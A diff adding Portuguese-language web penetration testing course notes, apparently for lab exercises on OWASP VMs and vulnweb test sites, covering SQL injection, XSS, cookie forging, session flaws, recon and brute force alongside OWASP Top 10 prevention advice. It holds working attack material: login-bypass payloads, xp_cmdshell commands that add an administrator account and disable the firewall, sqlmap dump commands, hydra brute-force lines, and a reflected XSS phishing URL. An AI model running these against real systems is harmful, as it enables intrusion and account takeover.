@@ -1,0 +1,807 @@
+SQL Injection OcoMon
+
+na aplicação
+
+Nome:	admin
+Senha:	pwd
+
+select id from usuarios where
+nome=$nome
+and
+senha=$senha
+
+-=-=- no banco -=-=-
+select if from usuarios where
+nome='admin'
+and
+senha='pwd';
+
+inject
+Nome:	admin
+Senha:	' or '1=1
+
+select id from usuarios where
+nome='admin'
+and
+senha='' or '1=1';
+
+www.owasp.org/index.php/Web_Application_Firewall
+
+
+
+wireshark
+capture os dados
+
+filtra
+ip.addr == SeuIP
+
+Usuário: 	admin ' or ' --
+Senha:		qualquercoisa
+
+Observe no wireshark que não houve nenhuma requisição ao servidor, o tratamento está no client.
+
+Faça denovo só que usuário qualquer e senha qualquer -- Erro de autenticação
+
+Agora sim foi enviado a requisição para o servidor
+
+A função return_valida() valida espaços, então vamos "bypassar"
+
+Agora vamos bypassar a função return_valida()
+
+Usuário:	admin ' or ' 1=1 --
+Senha:		qualquercoisa
+
+Inspection ou FireBug ache a função e deleta a função"return_valida()"
+
+Observação: No caso do OcoMon podemos passar tudo sem espaço que funciona também --> Usuário = admin'or'1=1-- e na senha só digitar para o javascript não retorne erro.
+
+Agora pelo Proxy - Tamper Data
+Firefox --> Clique em Ferramentas --> Tamper Data
+Na parte superior do TamperData clique em Iniciar Alteração
+
+Agora pelo Proxy - Burp Suite
+
+Clique na guia Proxy, depois na guia abaixo Options
+A maioria dos sites com multimidia (como portais de conteúdo) montam suas páginas dinamicamente com imagens vindo de vários servidores, para isso, a opção File entr... para ter excessões referente a imagens, para que você não precise autorizar os GETs desse conteúdo, tem que está checada.
+
+Outra coisa, ai também tem as configurações de proxy que você deve configurar no browser.
+127.0.0.1:8080
+
+Volte para a guia Interception e clique no botão Interception on
+Configure seu browser com esse endereço e porta
+
+SSL/TLS no Burp
+
+|CLI | ----> Burp ----> |SRV|\
+			      +-> HTTPS Cert Burp entre CLI e BURP e Cert SRV orig
+|CLI | <---- Burp <---- |SRV|/
+
+Usuário:	well
+Senha:		qualquercoisa
+
+vai no Burp, pois a requisição está parada no Burp
+
+Vai no valor de login
+
+login=well&password=qualquercoisa
+login=admin ' or ' 1=1 --&password=qualquercoisa
+
+e clique no botão Forward até terminar as requisições
+
+Outro ataque (session)
+
+sem está logado da um reload na página e pegue o Cookie de Sessão
+
+Coockie: PHPSESSION=momdiamdeiasdioasmedoieaneioc
+
+Copie a sessão
+
+Agora autentique no ocomon como no ataque anterior e verifique se a sessão alterou no POST
+
+Coockie: PHPSESSION=momdiamdeiasdioasmedoieaneioc
+
+Após autenticado observe que ele anexa o cookie
+
+http://IP/ocomon/index.php?momdiamdeiasdioasmedoieaneioc
+
+Ele não muda a sessão
+
+Conceito e Token --> http://www.tecmundo.com.br/senha/3077-o-que-e-token-.htm
+
+
+SQL INJECT em MS SQL Server
+============================
+xp_cmdshell { 'command_string' } [ , no_output ]
+-- Verificando quem é o usuário dono do serviço de MS SQL Server
+
+Habilitando XP_CMDSHELL
+-----------------------
+exec sp_configure
+exec sp_configure 'show advanced options',1
+reconfigure
+exec sp_configure
+exec sp_configure 'xp_cmdshell',1
+reconfigure
+exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--
+
+
+EXEC xp_cmdshell 'whoami'
+
+-- Criando Usuário Well
+EXEC xp_cmdshell 'net user well P@ssw0rd /ADD'
+EXEC xp_cmdshell 'net localgroup Administrators well /ADD'
+
+-- Desabilitando o Windows Firewall
+EXEC xp_cmdshell 'netsh firewall set opmode disable'
+
+-- Habilitando o Terminal Service - TS
+EXEC xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+
+Enable remote desktop from command line (CMD)
+by ADMIN on OCTOBER 2, 2010
+
+ 
+Remote desktop can be enabled/disabled by opening My computer properties and then by changing the settings in the ‘Remote‘ tab. We can do the same by editing registry key settings. This is explained below. Remote desktop is also called Terminal services or TS or RDP. This is an in-built remote desktop software for Windows users.
+
+To enable remote desktop.
+
+Open registry editor by running regedit from Run.
+Go to the node HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
+Change the data of the value fDenyTSConnections to 0.
+We can enable remote desktop from windows command line by running the following command.
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+To disable remote desktop we need to run the below command.
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+Reboot or logoff is not required after running the above command. I have tested this on Windows XP and Windows 7 and it has worked fine. It would work fine on Windows Vista too.
+
+To enable Remote assistance:
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+sqlmap
+------
+# sqlmap -u "URL" command
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" --dbs --> lista os dbs
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -d --> mostra apenas o banner
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" --current-db --> vai informar qual o db atual da app
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart --tables --> Lista as tabelas
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users --columns --> lista as colunas
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users -C 'uname,pass' --dump --> lista os dados
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users --dump-all --> lista todas as tabelas
+
+
+
+heoristica = a chute =]
+
+acunetix
+--------
+
+testasp.vulnweb.com
+
+
+-=-=-=-=-=-=-=-=
+
+Quebra de senha
+===============
+
+. Restrição de conteúdo / recursos
+. Autenticação HTTP:
+ - Basic --> Credenciais concatenadas separadas por ":" e codificadas em base64
+ - Digest --> Hash MD5 (A Way Hash)
+
+Um exemplo de codificação base64
+
+base64 teste
+uasdpoaksdmapsodjaosdm=
+
+echo "uasdpoaksdmapsodjaosdm=" | base64 -d
+teste
+
+. Identificadores de Sessão ("SESSION ID") expostos
+. Lembrete de Senha ou "logout" vulneráveis
+ - No lembrete de senha se a aplicação lhe enviar sua senha, existe um problema, pois a aplicação não deveria saber sua senha (hash ou selt+hash). Devemos apenas resetar sua senha.
+
++----+
+|    |
+|HOST|
+|WEB |<----------- Envia as Credenciais --------------| User
+|    |--- http://www.site.com?JSESSION=4234242342 --->|
+|    |
++----+
+      
+Cookie:
+[...]
+Authorization: Basic DfrgSRHRYI8kdertEeYrj678kertER6eSGsearty3577wasS==
+[...]
+Decodificado
+# echo "DfrgSRHRYI8kdertEeYrj678kertER6eSGsearty3577wasS==" | base64 -d
+teste:password
+
+
+Como se Previnir
+----------------
+
+. Tunelamento por SSL
+. Política de segurança
+. CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart - teste de Turing público completamente automatizado para diferenciação entre computadores e humanos)
+. Proteger Cookie
+
+Como rola força bruta de CAPTCHA
+
+GET /site
+
+var_captcha_X=?????
+
+Cada requisição muda o CAPTCHA, pois o CAPTCHA é uma pergunta que espera a reposta correta para aquela e somente aquela pergunta. Então temos uma matriz de CAPTCHA.
+
+para fazer a força bruta devemos garantir que sempre pergunte a mesma coisa e nossa wordlist troca a resposta esperada.
+
+var_captcha_A = 
+var_captcha_B = 
+var_captcha_C = 
+var_captcha_n = 
+
+mesmo que a próxima requisição troque para var_captcha_B forçamos o envio da var_captcha_A.
+
+GET /site
+POST var_captcha_A = xpto
+
+GET /site
+POST var_captcha_B = Troca por A = xpto2
+                 ^             +
+                 +-------------+
+
+Vamos fazer um teste, ligue a máquina owasp.
+
+Entre no site principal http://IP
+Clique no link OWASP WebGoat
+
+User: webgoat
+PWD: webgoat
+
+Clique no botão START
+
+Clique no link do lado esquerdo Authentication Flaws --> Forgate Password
+
+user: admin
+
+Secret Question: what is your favorite color?
+
+answer: blue, black, green <--força bruta
+
+Session Management Flaws --> Spoof in Authentications Cookie
+
+Auth --> webgoat:webgoat
+
+Show Cookie
+
+Auth Cookie = 65432ubphcfy
+JSESSION ID = qf34qtaaefwrgwaergegeagwqgawrhjhyjrek8krtk
+
+
+Auth --> aspect:aspect
+
+Show Cookie
+
+Auth Cookie = 65432udfqtb
+JSESSION ID = qf34qtaaefwrgwaergegeagwqgawrhjhyjrek8krtk
+
+Habilite o Tamper Data
+
+logue novamente com o usuário webgoat
+
+Auth --> webgoat:webgoat
+
+welcome webgoat <-- mostra que o usuário está auteinticado
+
+Agora dar um refresh com o tamper capturando as requisições e os post
+
+Na parte AuthCookie=altere pelo do aspect e verifique se o welcome muda para aspect.
+
+OK
+
+
+65432ubphcfy --> 7 caracteres que é o mesmo número de caracteres para webgoat
+65432udfqtb --> 6 caracteres que é o mesmo número de caracteres para aspect
+     +-- porque o "u" coicide? porque hambos terminam com a mesma letra "t" que é 1 caractere a frente do t (t + 1 = u)
+
+abcdefghijklmnopqrstuvwyxz
+
+w = y
+e = f
+b = c
+g = h
+o = p
+a = b
+t = u
+-----
+a = b
+s = t
+p = q
+e = f
+c = d
+t = u
+-----
+a = b
+l = m
+i = j
+c = d
+e = f
+
+
+alice --> tem 5 caracteres
+ecila --> fdjmb -+
+                 |
+65432fdjmb <-----+
+
+Agora de outro refresh e troque pelo auth cookie que criamos e verifique o welcome se está como alice
+
+XSS
+===
+
+. Ocorre quando uma palicação inclui dados não tratados em um objeto enviado ao navegador.
+. Existem 3 principais tipos:
+ - Stored
+ - Reflected
+ - DOM based XSS
+
+XSS é uma injeção é feita no cliente.
+
+. Os Impactos
+ - Roubo de informações de sessão
+ - pichação de sites
+ - Redirecionamento de usuário e etc.
+ - Exposição de informações dos usuários
+
+. Stored
+ - Código injetado é armazenado permanentemente na aplicação vulnerável (comentários, posts, logs, etc.)
+ - A vítima recebe o código malicioso junto com alguma requisição feita.
+
+
+   +------------------- Armazena um código malicioso ----| Atacante
+   v
++----+
+|    |
+|HOST|
+|WEB |<------------- Envia requisição ----------------| User
+|    |--- aplica~]ao envia código malicioso junto --->|
+|    |
++----+
+
+
+- Aplicação: dotProject
+- Versão: 2.1.5
+- Multiplas vulnerabilidades de XSS e SQLi
+
+Na submissão de arquivos é possível inserir um código malicioso no campo descrição
+
+Auth --> admin:admin
+
+Clique em Files --> New File
+Na Descrição coloque o seguinte: <script>alert('xss')</script>
+
+Agora vamos visualizar, nos é mostrado o PopUp XSS
+
+. Reflected
+ - O código é "refletido" para o usuário através de respostas que contenham dados não tratados recebidos pela aplicação (resultado de buscas, mensagens de erro, etc).
+ - Geralmente disseminado através de links maliciosos.
+
+Uma boa prática é quando arquivos forem "UPados", não salve ele com o nome original, para que não seja encontrado o caminho do arquivo no filesystem.
+
+
+  Atacante| ------- Envia um linko malicioso ------------+
+                                                         |
++----+                                                   |
+|    |                                                   |
+|HOST|                                                   v
+|WEB |<---------------- Acessa o link ----------------| User
+|    |------ aplicação responde a requisição  ------->|
+|    |
++----+
+
+
+http://testasp.vulnweb.com/search.asp
+
+<br><br>Entre aqui com suas credenciais:<form action="destination.asp""><table><tr><td>Nome:</td><td><input type=text length=20 name=nome></td></tr><tr><td>Senha:</td><td><input type=password length=20 name=senha></td></tr></table><input type=submit value=Acessar></form>
+
+http://testasp.vulnweb.com/search.asp?tfSearch=%3Cbr%3E%3Cbr%3EEntre+aqui+com+suas+credenciais%3A%3Cform+action%3D%22destination.asp%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ENome%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dnome%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3ESenha%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dsenha%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3Cinput+type%3Dsubmit+value%3DAcessar%3E%3C%2Fform%3E+
+
+http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EEntre+aqui+com+suas+credenciais%3A%3Cform+action%3D%22destination.asp%22%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ENome%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dtext+++length%3D20+name%3Dnome%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3ESenha%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dpassword+length%3D20+name%3Dsenha%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3Cinput+++type%3Dsubmit+value%3DAcessar%3E%3C%2Fform%3E
+
+
+.DOM based XSS
+ - Ocasionado por uma modificação no ambiente DOM do navegador da vítima.
+ - O código executado é legítimo, porém devido a essa alteração o ambiente sua execução é feita de maneira anônima.
+ - O seguinte código é executado no navegador (client-side)
+
+http://localhost/index.html
+<html>
+	<title>Welcome</title>
+	Hi
+	<script>
+		var pos=document.URL.indexOf("name=")+5;
+		document.write(unescape(document.URL.substring(pos,document.URL.length)));
+	</script>
+	<br>
+	Welcome to our system!
+</html>
+
+ - A variável "name" pode ser manipulada conforme o exemplo a seguir
+http://localhost/index.html?name=Teste<script>alert(XSS)</script>
+
+ - Escapar caracteres vindo de fontes não confiáveis e que serão utilizados no contexto do navegador (body, atributos, JavaScript, CSS, URL).
+ - A validação positiva é sempre interessante mas é preciso atentar para peculiaridades da aplicação em questão pois caracteres especiais e condificações diversas podem fazer parte da rotina da aplicação.
+
+Referencia Direta a Objetos
+---------------------------
+. Apenas proteção na comada de apresentação não funciona. Por exemplo, se o usuário admin estiver logado ele tem mais funcionalidade doque um usuário comum, e isso, é feito na apresentação.
+. Atacantes simplesmente altera parâmetros e consegue acessar o conteúdo.
+
+
++----+
+|    |
+|HOST|<----------- Acessa a aplicação ----------------|
+|WEB |--- http://www.site.com?conta?=852 ------------>| Atacante
+|    |<--- http://www.site.com?conta?=853 ------------|
+|    |----------- App Responde sem validar ---------->|
++----+
+
+Como previnir
+-------------
+. Trocar referências diretas por um valor de mapeamento aleatório temporário
+. Verificar se o parâmetro está dentro do padrão
+. Verificar se o usuário tem permissão de acesso
+. Verificar se o usuário pode executar a ação que deseja em um determinado objeto
+
+
+Falhas de Configuração
+----------------------
+. Aplicações rodam em cima de serviços que rodam em cima de S.Os
+. Todos podem ser vetores de ataque
+. Exploits (e patches!) se aplicam à qualquer tipo de software
+
+Como previnir
+-------------
+. Hardening de servidores
+. Patches e ataulizações
+. Homologação de mudanças
+. Vulnerability Management
+
+Exposição de Dados Sensíveis
+----------------------------
+
+. Falhas mais comum e grave: simplesmente não criptografar dados sensíveis
+. Falhas quando a criptografia é empregada:
+ - Geração e armazenamento inseguros de chaves
+ - Não implantar políticas de rotação de chaves
+ - Utilizar algoritmos de criptografia fracos
+ - Utilizar métodos de criptografia em uma só via (hash) fracos ou sem salto para proteger senhas.
+ - Falha em proteger o tráfego de rede onde passam os dados da aplicação
+ - Utilização de criptografia somente na autenticação (expondo dados IDs de seção)
+ - Utilização de certificados expirados ou mal configurados
+ - Falhas básicas de fácil detecção, bastando observar o tráfego de rede do site.
+
+Impacto
+-------
+. Frequentemente comprometem todos os dados protegidos por criptografia
+. Tipicamente, este dados incluem, mas não estão limitados à:
+ - Credenciais de acesso
+ - Dados pessoais
+ - Registros de saúde
+ - Cartão de crédito, etc.
+
+Como previnir
+-------------
+. Algoritmos de criptografia e chaves utilizados devem ser apropriadamente forte
+. Senhas devem ser armazenadas em hash com um algoritmo de criptografia em uma só via, forte e com um salto apropriado
+. Proteger o transporte de dados adequadamente pode afetar o projeto do site. Em geral, é mais simples forçar o uso de criptografia em todo o site.
+
+Falha no Controle de Acesso
+---------------------------
+
+. Usuário autorizado modifica um parâmetro ou URL e acessa uma função privilegiada
+. Usuário anônimo acessa funções desprotegidas
+. Impacto
+ - Acesso a conta e dados de outros usuários
+ - Realizar ações de privilégio maior que devido
+
++----+
+|    |<----------- http://web.com/user/add -----------|
+|HOST|<----------- http://web.com/backup.bkp ---------|
+|WEB |<----------- http://web.com/web.config ---------| Atacante
+|    |<--- http://web.com/admin/newuser.aspx ---------|
+|    |--------------- Acesso Permitido -------------->|
++----+
+
+Como previnir
+-------------
+. Restringir acesso a usuários autenticados
+. Mostrar somente o que for designado ao usuário ou ao grupo
+. Negar qualquer requisição a páginq não autorizada
+. Deve-se negar todo o conteúdo (DENY ALL)
+
+Cross Site Request Forgery - CSRF
+---------------------------------
+. Browsers enviam alguns tipos de credenciais automaticamente
+ - Cookies
+ - Cabeçãlhos
+ - Endereço IP
+ - Certificados SSL
+
+Impacto
+-------
+. A vítima acessa um site malicioso enquanto está logado no sistema vulnerável
+. O atacante força a vítima a fazer tal requisição
+
+  Atacante| ------ <img src http://web.com/alter.asp ----+
+                                                         |
++----+                                                   |
+|    |<--------------------------------------------------+
+|HOST|<---------------- Usuário Autenticado ----------|
+|WEB |----------------- Imagem com URL ---- --------->|
+|    |------ GET /alter.asp?newpass=xxx --+           | User  
+|    |<-----------------------------------+           |
+|    |------ Aplicação responde + alteração --------->|
++----+
+
+Como previnir
+-------------
+. Autenticações forçadas em requisições sensíveis
+. Controle exposição de dados utilizados como credenciais
+. Adicionar um token secreto, não automático, para todas requisições importantes
+
+Utilização de componentes vulneráveis
+-------------------------------------
+. Componentes bibliotecas e frameworks
+. Demora na divulgação da vulnerabilidade
+. Muitos produtores não lançam uma correção (hot fix)
+
+Como previnir
+-------------
+. Monitorar versões de todos os componentes, incluindo todas dependências
+. Manter componentes sempre atualizados
+. Organizar uma política de segurança
+. Buscar uma alternativa enquanto uma correção não aparece
+
+Redirecionamentos e Repasses não Validados
+------------------------------------------
+. Falha em validar o destino de redirecionamento ou repasses utilizados
+. Problemas mais comuns:
+ - Ausência de validação do destino de um redirecionamento ou repasse
+ - Similaridade entre redirecionamento para destinos internos (da própria aplicação) e externos.
+
+Impacto
+-------
+. Redirecionamentos podem induzir usuários a instalar malware ou revelar informações sensíveis.
+. Repasses inseguros podem permitir contornar controles de acesso.
+
+Como previnir
+-------------
+. Evitar estas falhas é ext5remamente importante, pois elas são os alvos favoritos de phishers tentando ganhar a confiança de um usuário.
+. Recomendações básicas para utilizar redirecionamentos e repasses:
+ - Não envolver parâmentros de usuários para calcular o destino
+ - Se não puder ser evitar, validar o parâmetro e verificar autorização do usuário
+
+
+
+Exposição de informaões
+=======================
+. Visa obter o máximo de informações possível sobre o alvo
+. Ações "passivas" mesmo que interangindo com a aplicação
+. Fontes externas e internas
+
+Spiders, Robots e Crawlers
+--------------------------
+. Robots.txt
+. Restrição para indexadores Web
+. Restrição não obrigatória
+. Pode expor detalhes sobre a aplicação
+ - Exemplos:
+
+User-agent: *
+Allow:/arquivo/inofensivo
+Disallow:/arquivo/ultra/secreto
+
+http://www.google.com/robots.txt
+
+
+Sites de Busca
+--------------
+. Provavelmente o alvo já foi indexado
+. Operadores para restrição de busca:
+ - site:
+ - intitle:
+ - filetype:
+. Google Hacking
+ - Google Hacking Data Base - GHDB
+ - Google Hacking fot Pentesters - GHPT
+
+Mapeamento de Pontos de Entrada
+-------------------------------
+. Mapeamento superficial
+. Potenciais vetores de ataque
+. Caminho de menor resistência
+. Dados recebidos do usuário
+. Variáveis em Cookies
+. Campos ocultos
+. Códigos de Status não Comuns (300s, 400s, 500)
+. Método GET e HTTP POST
+. Utilizar um proxy
+ - Requisições
+ - Headers
+ - Parâmetros
+Colocar resultados em uma planilha
+
+. HTTP GET
+GET https://www.banco.com.br/transferencia.jsp?CONTA=123&QUANTIA=1000&PARA=124
+Host: www.banco.com.br
+Cookie: SESSIONID=csavSADasckINOnmsslkGhya
+
+Conta, Quantia, Para e SessionID são relevantes neste request.
+
+. HTTP POST
+POST https://www.banco.com.br
+Host: www.banco.com.br
+Cookie:
+SESSIONID=bggbfgbfgCNJasnsnJCKoAsybucAO==CustomCookie=00meu00ip00verdadeiro00192.168.0.100user=Root&password=Segredo"&IP=true
+user, password, IP, Cookie e CustomCookie são relevantes neste request
+
+http://web.archive.net
+
+Application --> 03 - Web Application Analysis --> w3af
+Plugin --> Discovery --> ArchaveDotOrg, Dir_Bruter, Bing, Google GHDB, etc Esses são os plugins de Crawlers (Google Hacking)
+
+Quando executado um teste de força bruta em uma aplicação web que autentica no formulário da página como saber quando o retorno é verdadeiro, ou seja, quebrou a senha?
+
+Bom temos alguns indicios, não podemos saber o que a aplicação devolve quando autenticado, mas podemos saber o que ela retorna quando não estamos, então fazemos nossos filtros entregar resultados que não são iguais aos que já conhecemos como errado.
+
+Podemos fazer também por heoristica, tentando adivinhar strings que exzistem quando estamos logado, como logout, signout, etc.
+
+Tem outra coisa, as podemos testar a existencia de alguns formulários, pois quando eles existem e não temos acesso, a aplicação nos retorna um 403 Forbinden, enquanto que se ela não existir retorna um 404 Not Found.
+
+Criando a lista de vetores de entrada
+-------------------------------------
+VM OWASP --> Wordpress
+
+- O que temos como vetor de entrada?
+- O Search
+- Vamos habilitar nosso proxy para analisar a este campo (TamperData ou BurpSuite)
+- Digite teste e clique em Search e vamos analisar o que está sendo enviado.
+- Foi Criado um Cookie (sempre procure por requisições POST)
+- existe exposição de URL ?page_id=2 <-- altere este número para ver o que acontece
+
+Devemos sempre observar:
+ - Navegar pela aplicação
+ - observar parametros na URL
+ - Variações de informações em cabeçalhos
+ - Variações de informações em cookies
+ - Campos ocultos
+
+Baseados nos paramtros que eu colhi podemos fazer tentativa de:
+- Manipulação de sessão --> Aqui temos que atentar para parametros de sessão
+- Injeções --> Aqui temos atentar para parametros dinamicos, que dependendo do paramatro ele apresenta resultados diferentes.
+
+Figerprinting
+-------------
+# nc IP 80
+HEAD / HTTP/1.0\n\n
+
+Server:?????
+
+Outra forma de ver qual o serviço é a montagem do cabeçalho, por exemplo, no Apache o campo Date fica no inicio enquanto que no IIS fica no meio do cabeçalho.
+
+# nmap -sV -p80 IP
+Vem o Banner do Apache.
+
+Discovery
+---------
+
+Descobrir os serviços Web
+
+# nmap -sV -p80 IP --> Não é suspeito pois foi respeitado o 3WH
+# nmap -sS -sV IP --> Já é suspeito pois não fechamos o 3WH, apenas mandando a flag Syn, além disso, estamos rodando nas 1000 portas com serviços mais relevantes (21, 22, 80, 8080, 3306, 3389, etc)
+
+# nmao -sS -sV -p- IP --> agora vamos varrer todas as 65.536 portas garantindo que todas as portas foram verificadas se existem ou não serviços.
+
+
+# nmap -sS -sV -O -p- IP --> Verificar qual sistema operecional está rodando
+
+# dig @ns1.dreamhost.com clavis.com.br
+# dig @ns1.dreamhost.com clavis.com.br ANY
+
+
+Configurações e Manutenções
+===========================
+
+Autenticação
+============
+Abre a VM OWASP/tiki
+
+# wireshark &
+
+Na página inserir usuário e senha para analisar os dados enviados
+
+Para a captura
+
+vamos criar o filtro no wireshark
+
+http.request.method == "POST"
+
+Botão direito do mouse no pacote --> Follow TCP Stream
+
+Analise o pacote resconstruido.
+
+outra forma é utilizando o sniifing da interface pelo dsniff
+# dsniff -i eth0
+
+ou
+
+# tcpdump -i eth0 -s0 -w test.cap
+# ftp bot.how2sec.com.br
+user: teste
+pwd: teste
+# dsniff -p test.cap
+
+# hydra -l user -p senha IP ftp <-- -p manda uma vez
+# hydra -l admin -P wordlist.txt IP ftp < -P vai mandar cada linha do arquivo como senha
+
+
+										+--- Path
+										|		   +--- Campo
+										|		   |		 +-- Campo
+										v		   v		 v
+# hydra -l teste -P /usr/share/john/password.lst vm_wasp http-post-form "/tikiwiki/tiki-index.php:user=^USER^&pass= ^PASS^:invalid username or password"
+                ^
+		+--- Campo que informe o (in)sucesso
+
+Podemos analisar a URL que é enviada para "Resetar" a senha e fazer um fuze para tentar torcar a senha de algum usuário
+
+https://community.gns3.com/resetPassword!input.jspa?username=w3ll&token=HwM1HiaP <-- Token
+									^      ^
+									+------+--------- Fuze
+
+BurpSuite
+
+Clique na guia Intruder								      +-- Indica onde vai entrar o Payload
+Target --> url, port protocol							      v
+Paramters --> https://community.gns3.com/resetPassword!input.jspa?username=w3ll&token=$
+Payloads --> pode passar uma lista ou adicionar um por um
+Options --> opções do ataque
+
+
+Capturar dados RAW do form de autenticação
+Copia os dados para um arquivo texto
+Salve request.txt
+
+# vi request.txt
+# sqlmap -r /root/request.txt -p tfUPass
+
+
+
+
+
+
+Gerenciamento de Sessões
+========================
+
+Autorização
+===========
+
+Funcionalidades e Lógica
+========================
+
+Validação de Dados
+==================
+
+Disponibilidade
+===============
+
+Web Services
+============
+
+AJAX
+====
+
+
